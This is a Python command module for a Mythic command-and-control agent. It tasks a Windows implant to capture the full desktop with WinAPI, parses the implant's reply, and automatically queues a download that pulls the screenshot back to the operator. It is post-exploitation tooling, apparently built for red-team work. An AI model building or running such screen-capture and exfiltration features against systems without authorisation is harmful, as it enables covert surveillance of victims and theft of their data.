from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Capture the full desktop using native WinAPI (StretchBlt) and upload it as a BMP image with Mythic screenshot UI support."
    version = 2
    author = "b4r0n"
    parameters = []
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="OFSTeam", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # Log API usage artifact for operator visibility
        await MythicRPC().execute(
            "create_artifact",
            task_id=task.id,
            artifact="WinAPI StretchBlt (screen capture)",
            artifact_type="API Call",
        )
        task.display_params = "Capturing full-screen image"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        """
        Process agent response from the Rust agent.
        Expected format: "screenshot_captured::C:\\path\\to\\file.bmp|12345|screenshot_123.bmp|screenshot"
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

        try:
            # Extract the response text
            if isinstance(response, str):
                response_text = response
            elif isinstance(response, dict):
                response_text = response.get("output", str(response))
            else:
                response_text = str(response)

            # Look for the screenshot_captured line
            screenshot_line = None
            for line in response_text.splitlines():
                if line.startswith("screenshot_captured"):
                    screenshot_line = line.strip()
                    break

            if screenshot_line and screenshot_line.startswith("screenshot_captured::"):
                # Parse the Apollo-style format
                remaining = screenshot_line[len("screenshot_captured::") :].strip()
                parts = remaining.split("|")

                if len(parts) >= 3:
                    file_path = parts[0].strip()
                    file_size = parts[1].strip()
                    filename = parts[2].strip()

                    # Validate file_size
                    try:
                        size_int = int(file_size)
                    except ValueError:
                        size_int = -1

                    if size_int > 0:
                        # Create download task to pull the file from the agent
                        download_params = {"file": file_path}
                        download_task = await SendMythicRPCTaskCreate(
                            MythicRPCTaskCreateMessage(
                                TaskID=task.Task.ID,
                                CommandName="download",
                                Parameters=json.dumps(download_params),
                                CallbackID=task.Callback.ID,
                            )
                        )

                        if download_task.Success:
                            await SendMythicRPCResponseCreate(
                                MythicRPCResponseCreateMessage(
                                    TaskID=task.Task.ID,
                                    Response=f"✅ Screenshot captured: {filename} ({file_size} bytes). Download task created automatically.".encode(),
                                )
                            )
                        else:
                            await SendMythicRPCResponseCreate(
                                MythicRPCResponseCreateMessage(
                                    TaskID=task.Task.ID,
                                    Response=f"⚠️ Screenshot captured but automatic download failed. File saved at: {file_path}".encode(),
                                )
                            )
                    else:
                        await SendMythicRPCResponseCreate(
                            MythicRPCResponseCreateMessage(
                                TaskID=task.Task.ID,
                                Response=f"❌ Invalid file size: {file_size}".encode(),
                            )
                        )
                        resp.Success = False
                else:
                    await SendMythicRPCResponseCreate(
                        MythicRPCResponseCreateMessage(
                            TaskID=task.Task.ID,
                            Response=f"❌ Failed to parse screenshot info from: {screenshot_line}".encode(),
                        )
                    )
                    resp.Success = False
            else:
                # No screenshot_captured line found
                await SendMythicRPCResponseCreate(
                    MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=f"❌ Agent did not return screenshot_captured format. Response: {response_text[:200]}".encode(),
                    )
                )
                resp.Success = False

        except Exception as e:
            resp.Success = False
            resp.Error = str(e)
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=f"⚠️ Error processing screenshot response: {str(e)}".encode(),
                )
            )

        return resp
